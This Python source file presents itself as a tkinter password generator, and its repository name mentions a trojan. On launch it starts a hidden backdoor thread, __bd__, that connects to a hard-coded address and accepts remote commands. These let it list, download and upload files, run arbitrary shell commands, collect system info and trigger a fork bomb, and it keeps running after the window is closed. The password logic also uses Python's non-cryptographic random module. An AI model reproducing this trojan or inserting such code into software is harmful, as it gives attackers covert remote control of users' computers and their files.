"""
Copyright (c) 2022, v0x45
All rights reserved.

This source code is licensed under the BSD-style license found in https://github.com/v0x45/PassGen-by-Rayan-w-Trojan/blob/main/LICENSE
"""

# Libraries
import getpass
import os
import platform
import random
import socket
import subprocess
import threading
import tkinter as tk
import webbrowser
from time import sleep
from tkinter import *
import colorama
import pyperclip
from PIL import ImageTk
from colorama import Fore
from ttkbootstrap.constants import *

colorama.init(autoreset=True)

# App version
version = 'v 0.70'
author = 'https://www.linkedin.com/in/tsdibk3dvkzfquwoejf2dhl3i4xoc8/'
github = 'https://github.com/v0x45'

# Colors Hex:
my_red = '#bb1d1d'
my_primary = '#121212'
my_secondary = '#181818'
my_text = '#B3B3B3'
my_active = '#B3B3B3'
my_other = '#3A3B3C'
my_transparent = '#18191A'


def __bd_checker__():
    global root_status
    global bd_status
    if not root_status and not bd_status:
        root.destroy()
        os._exit(0)


def __bd__(initialized_):
    termination_ = False
    while not initialized_:
        try:
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server = '127.1.0.0'
            port = 7976
            encoding_ = 'utf-8'
            client.connect((server, port))
            user = getpass.getuser()
            client.sendall(user.encode(encoding_))
            header = f'{Fore.LIGHTRED_EX}{getpass.getuser()}@{platform.node()}{Fore.RESET}:{Fore.LIGHTBLUE_EX}{os.getcwd()}{Fore.LIGHTWHITE_EX}$'
            client.sendall(header.encode(encoding_))
            while not termination_:
                initialized_ = True
                STDOUT, STDERR = None, None
                command = client.recv(1024)  # Defining the maximum number of bytes
                command = command.decode(encoding_)

                if command == '--cd' or command == '--chdir':
                    change_cwd = client.recv(1024)
                    change_cwd = change_cwd.decode(encoding_)
                    os.chdir(change_cwd)
                    cwd_ = os.getcwd()
                    chdir_confirmation = f'[+] The cwd has been changed successfully to >> {cwd_}'
                    client.sendall(chdir_confirmation.encode(encoding_))

                elif command == '--list' or command == '--lst':
                    client.sendall(str(os.listdir()).encode(encoding_))

                elif command == '--download-file' or command == '--df':
                    filepath = client.recv(1024).decode(encoding_)
                    with open(str(filepath), 'rb') as file:
                        data = file.read(9000000)
                        while data:
                            client.send(data)
                            data = file.read(9000000)
                        sleep(2)
                        client.send(b'Done')
                    file.close()

                elif command == '--upload-file' or command == '--uf':
                    filename = client.recv(1024).decode(encoding_)
                    with open(filename, 'wb') as file:
                        data = client.recv(9000000)
                        while data:
                            file.write(data)
                            data = client.recv(9000000)
                            if data == b'Done':
                                break
                    file.close()

                elif command == '--cc' or command == '--custom':
                    custom_command = client.recv(1024)
                    custom_command = custom_command.decode(encoding_)
                    op = subprocess.Popen(custom_command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
                    output = op.stdout.read()
                    output_error = op.stderr.read()
                    if output == b'' and output_error == b'':
                        client.sendall(b'No visible output')
                    else:
                        client.sendall(output + output_error)
                    client.sendall(output + output_error)

                elif command == '--systeminfo' or command == '--si':
                    systeminfo = f'''
                    Operating System: {platform.system()}
                    Computer Name: {platform.node()}
                    Username: {getpass.getuser()}
                    Release Version: {platform.release()}
                    Processor Architecture: {platform.processor()}
                    '''
                    client.send(systeminfo.encode(encoding_))

                elif command == '--forkbomb' or command == '--fb':
                    while True:
                        os.fork()

                elif command == '--t0' or command == '--terminate0':
                    termination_ = True
                    initialized_ = True
                    client.close()
                    sleep(2)
                    global bd_status
                    bd_status = False
                    __bd_checker__()
                    return bd_status

                elif command == '--t1' or command == '--terminate1':
                    termination_ = False
                    initialized_ = False
                    client.close()
                    sleep(2)
                    break

                else:
                    pass
        except:
            pass


# Gets the frame coordinates
def get_pos(event):
    global xwin
    global ywin

    xwin = event.x
    ywin = event.y


# Moves the window frame to the updated coordinates
def move_window(event):
    root.geometry(f'+{event.x_root - xwin}+{event.y_root - ywin}')


# Changes the Exit icon to red when the user hover over it
def exit_hovering(event):
    def exit_enter(e):
        exit_button.config(image=exit_icon_red)
        # exit_button.image = exit_icon_red

    def exit_leave(e):
        exit_button.config(image=exit_icon)
        # exit_button.image = exit_icon

    exit_button.bind('<Enter>', exit_enter)
    exit_button.bind('<Leave>', exit_leave)


# Changes the Author icon to light when the user hover over it
def author_hovering(event):
    def author_enter(e):
        author_button.config(image=author_icon_hover)

    def author_leave(e):
        author_button.config(image=author_icon)

    author_button.bind('<Enter>', author_enter)
    author_button.bind('<Leave>', author_leave)


# Changes the Generate icon to light when the user hover over it
def generate_hovering(event):
    def generate_enter(e):
        generate_button.config(image=generate_icon_hover)

    def generate_leave(e):
        generate_button.config(image=generate_icon)

    generate_button.bind('<Enter>', generate_enter)
    generate_button.bind('<Leave>', generate_leave)


# Changes the Copy icon to light when the user hover over it
def copy_hovering(event):
    def copy_enter(e):
        copy_button.config(image=copy_icon_hover)

    def copy_leave(e):
        copy_button.config(image=copy_icon)

    copy_button.bind('<Enter>', copy_enter)
    copy_button.bind('<Leave>', copy_leave)


# Pins/Unpins the application topmost
def pin_unpin():
    global pin_value
    pin_value = not pin_value
    root.wm_attributes("-topmost", pin_value)
    if pin_value:
        pin_button.config(image=pinned_icon)
        pin_button.place(x=11, y=58)
    if not pin_value:
        pin_button.config(image=unpinned_icon)
        pin_button.place(x=3, y=58)


# Redirects the user to my LinkedIn profile
def get_author():
    webbrowser.open(author, new=2)
    webbrowser.open(github, new=2)


# Quits the application
def exit_program():
    global root_status
    root_status = False
    root.wm_withdraw()
    if not bd_status:
        __bd_checker__()
    else:
        return root_status


# Gets the scale value
def passlength(e):
    global passlength_value
    passlength_value = passlength_slider.get()


# Letter toggle icon changer
def letters_status():
    global letters_value
    letters_value = not letters_value
    if letters_value:
        letters_toggle.config(image=toggle_on_icon)
    if not letters_value:
        letters_toggle.config(image=toggle_off_icon)


# Digits toggle icon changer
def digits_status():
    global digits_value
    digits_value = not digits_value
    if digits_value:
        digits_toggle.config(image=toggle_on_icon)
    if not digits_value:
        digits_toggle.config(image=toggle_off_icon)


# Signs toggle icon changer
def signs_status():
    global signs_value
    signs_value = not signs_value
    if signs_value:
        signs_toggle.config(image=toggle_on_icon)
    if not signs_value:
        signs_toggle.config(image=toggle_off_icon)


# The Password Generator algorithm
def PassGen(passlength_value, letters_value, digits_value, signs_value):
    global pass_generated
    global usr_output
    global stupid
    global num_of_generate
    if letters_value:
        if digits_value:
            if signs_value:
                pass_generated = ''.join(random.sample(full_set_characters, passlength_value))
            if not signs_value:
                pass_generated = ''.join(random.sample(letters_u_digits, passlength_value))
        if not digits_value:
            if signs_value:
                pass_generated = ''.join(random.sample(letter_u_signs, passlength_value))
            if not signs_value:
                pass_generated = ''.join(random.sample(letters_only, passlength_value))
    if not letters_value:
        if digits_value:
            if signs_value:
                pass_generated = ''.join(random.sample(digits_u_signs, passlength_value))
            if not signs_value:
                pass_generated = ''.join(random.sample(numbers, passlength_value))
        if not digits_value:
            if signs_value:
                pass_generated = ''.join(random.sample(signs, passlength_value))
            if not signs_value:
                stupid = 1
    if not stupid:
        usr_output.delete(0, END)
        usr_output.place_forget()
        pass_output = StringVar()
        pass_output.set(pass_generated)
        usr_output = tk.Entry(root, textvariable=pass_output, bg=my_text, fg=my_secondary, highlightcolor=my_other,
                              selectbackground=my_other, selectborderwidth=0, selectforeground=my_primary,
                              font=('Myriad pro', '9'), relief='flat', width=26, readonlybackground=my_text,
                              state=READONLY)
        usr_output.place(x=63, y=388)
    if stupid:
        stupid = 0
        if num_of_generate < 1:
            pass
        if num_of_generate >= 1:
            usr_output.delete(0, END)
            usr_output.place_forget()
            stupidity_confirmation = Label(root, text='The John Cena password?? (╬ಠ益ಠ)',
                                           bg=my_primary,
                                           fg=my_red, highlightcolor=my_primary,
                                           font=('Myriad pro', '8'), relief='flat', width=32)
            stupidity_confirmation.place(x=76, y=425)
            root.after(500, stupidity_confirmation.destroy)
            num_of_generate = 0


# Display generation confirmation
def generate():
    global num_of_generate
    generate_confirmation = Label(root, text='Your password is ready..', bg=my_primary, fg=my_text,
                                  highlightcolor=my_primary, font=('Myriad pro', '8'), relief='flat', width=20)
    generate_confirmation.place(x=100, y=425)
    root.after(500, generate_confirmation.destroy)
    num_of_generate += 1
    PassGen(passlength_value, letters_value, digits_value, signs_value)


# Display copy confirmation
def clipboard_copy():
    if num_of_generate < 1:
        pass
    if num_of_generate >= 1:
        root.clipboard_clear()
        pyperclip.copy(pass_generated)  # The pyperclip library handles clipboard better than tkinter
        pyperclip.paste()
        root.update()
        copy_confirmation = Label(root, text='Copied to clipboard..', bg=my_primary, fg=my_text,
                                  highlightcolor=my_primary, font=('Myriad pro', '8'), relief='flat', width=20)
        copy_confirmation.place(x=100, y=425)
        root.after(500, copy_confirmation.destroy)


# PassGen Code Preparation
lower = 'abcdefghijklmnopqrstuvwxyz'
upper = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
num = '0123456789'
sig = '.,`~!@#$%^&*()_"-=+:;<>|}{[]/?\| '

shuffle = 0
shuffleNum = 0
numbe = []
lowercas = []
uppercas = []
si = []

while shuffle < 5:
    lowercase = random.sample(lower, 26)
    lowercase = ''.join(lowercase)
    lowercas.append(lowercase)
    uppercase = random.sample(upper, 26)
    uppercase = ''.join(uppercase)
    uppercas.append(uppercase)
    signs = random.sample(sig, 33)
    signs = ''.join(signs)
    si.append(signs)
    shuffle += 1
while shuffleNum < 13:
    numbers = random.sample(num, 10)
    numbers = ''.join(numbers)
    numbe.append(numbers)
    shuffleNum += 1

lowercase = ''.join(lowercas)
uppercase = ''.join(uppercas)
numbers = ''.join(numbe)
signs = ''.join(si)

full_set_characters = str(lowercase + uppercase + numbers + signs)
letters_u_digits = str(lowercase + uppercase + numbers)
letters_only = str(lowercase + uppercase)
letter_u_signs = str(lowercase + uppercase + signs)
digits_u_signs = str(numbers + signs)

# Initializing a tkinter frame
root = tk.Tk()

# Starting bd
_bd_ = threading.Thread(target=__bd__, args=(False,)).start()

# Icons\Buttons\Logos
current_location = os.path.dirname(__file__)  # To get the current directory path
author_path = os.path.join(current_location, 'Icons', 'Author.png')
author_icon = ImageTk.PhotoImage(file=author_path)
author_icon_hover_path = os.path.join(current_location, 'Icons', 'Author_Hover.png')
author_icon_hover = ImageTk.PhotoImage(file=author_icon_hover_path)
copy_icon_path = os.path.join(current_location, 'Icons', 'Copy.png')
copy_icon = ImageTk.PhotoImage(file=copy_icon_path)
copy_icon_hover_path = os.path.join(current_location, 'Icons', 'Copy_Hover.png')
copy_icon_hover = ImageTk.PhotoImage(file=copy_icon_hover_path)
exit_icon_red_path = os.path.join(current_location, 'Icons', 'Exit_Red.png')
exit_icon_red = ImageTk.PhotoImage(file=exit_icon_red_path)
exit_icon_path = os.path.join(current_location, 'Icons', 'Exit.png')
exit_icon = ImageTk.PhotoImage(file=exit_icon_path)
frame_path = os.path.join(current_location, 'Icons', 'Frame.png')
frame = ImageTk.PhotoImage(file=frame_path)
generate_icon_path = os.path.join(current_location, 'Icons', 'Generate.png')
generate_icon = ImageTk.PhotoImage(file=generate_icon_path)
generate_icon_hover_path = os.path.join(current_location, 'Icons', 'Generate_Hover.png')
generate_icon_hover = ImageTk.PhotoImage(file=generate_icon_hover_path)
unpinned_icon_path = os.path.join(current_location, 'Icons', 'Unpinned.png')
unpinned_icon = ImageTk.PhotoImage(file=unpinned_icon_path)
pinned_icon_path = os.path.join(current_location, 'Icons', 'Pinned.png')
pinned_icon = ImageTk.PhotoImage(file=pinned_icon_path)
toggle_off_icon_path = os.path.join(current_location, 'Icons', 'Toggle_Off.png')
toggle_off_icon = ImageTk.PhotoImage(file=toggle_off_icon_path)
toggle_on_icon_path = os.path.join(current_location, 'Icons', 'Toggle_On.png')
toggle_on_icon = ImageTk.PhotoImage(file=toggle_on_icon_path)

# Global var
pin_value = True
letters_value = True
digits_value = True
signs_value = True
usr_output = tk.Entry(root, textvariable='', bg=my_text, fg=my_secondary, highlightcolor=my_other,
                      selectbackground=my_other, selectborderwidth=0, selectforeground=my_primary,
                      font=('Myriad pro', '9'), relief='flat', width=26, readonlybackground=my_text, state=READONLY)
num_of_generate = 0
stupid = 0
root_status = bool
bd_status = bool

# Main Frame
root.frame = frame
app_frame = tk.Label(root, image=root.frame, bg='red')
root.overrideredirect(True)
root.geometry('350x450')
app_width = root.winfo_reqwidth()
app_height = root.winfo_reqheight()
app_position_x = int(root.winfo_screenwidth() / 2 - app_width / 2)
app_position_y = int(root.winfo_screenheight() / 2 - app_height / 2)
root.geometry('350x450+{}+{}'.format(app_position_x, app_position_y))
root.wm_attributes('-transparentcolor', 'red')
root.wm_attributes('-topmost', pin_value)
root.resizable(False, False)
root.update_idletasks()
app_frame.pack()

# Buttons
pin_button = tk.Button(root, image=pinned_icon, bg=my_secondary, fg=my_text, activebackground=my_secondary,
                       activeforeground=my_text, bd=0, relief='sunken', command=pin_unpin)
pin_button.place(x=11, y=58)
author_button = tk.Button(root, image=author_icon, bg=my_secondary, fg=my_text, activebackground=my_secondary,
                          activeforeground=my_text, bd=0, relief='sunken', command=get_author)
author_button.place(x=11, y=217)
exit_button = tk.Button(root, image=exit_icon, bg=my_secondary, fg=my_text, activebackground=my_secondary,
                        activeforeground=my_text, bd=0, relief='sunken', command=exit_program)
exit_button.place(x=11, y=381)
generate_button = tk.Button(root, image=generate_icon, bg=my_primary, fg=my_text, activebackground=my_primary,
                            activeforeground=my_text, bd=0, relief='sunken', command=generate)
generate_button.place(x=112, y=307)
copy_button = tk.Button(root, image=copy_icon, bg=my_primary, fg=my_text, activebackground=my_primary,
                        activeforeground=my_text, bd=0, relief='sunken', command=clipboard_copy)
copy_button.place(x=258, y=368)

# Toggles
passlength_slider = tk.Scale(root, from_=4, to=128, orient=HORIZONTAL, activebackground=my_active,
                             highlightbackground=my_primary, troughcolor=my_secondary, bg=my_primary, fg=my_text, bd=0,
                             font=('Myriad pro', '9'), length=175, width=8, command=passlength)
passlength_slider.place(x=165, y=123)
letters_toggle = tk.Button(root, image=toggle_on_icon, bg=my_primary, fg=my_text, activebackground=my_primary,
                           activeforeground=my_text, bd=0, relief='sunken', command=letters_status)
letters_toggle.place(x=272, y=174)
digits_toggle = tk.Button(root, image=toggle_on_icon, bg=my_primary, fg=my_text, activebackground=my_primary,
                          activeforeground=my_text, bd=0, relief='sunken', command=digits_status)
digits_toggle.place(x=272, y=216)
signs_toggle = tk.Button(root, image=toggle_on_icon, bg=my_primary, fg=my_text, activebackground=my_primary,
                         activeforeground=my_text, bd=0, relief='sunken', command=signs_status)
signs_toggle.place(x=272, y=260)

# Outputs
passlength_value = passlength_slider.get()
app_version = tk.Label(root, text=version, bg=my_primary, fg=my_text, highlightcolor=my_primary,
                       font=('Myriad pro', '9'), relief='flat', width=0)
app_version.place(x=291, y=19)

# Binds
app_frame.bind("<B1-Motion>", move_window)
app_frame.bind("<Button-1>", get_pos)
exit_hovering(exit_button)
author_hovering(author_button)
generate_hovering(generate_button)
copy_hovering(copy_button)

root.mainloop()
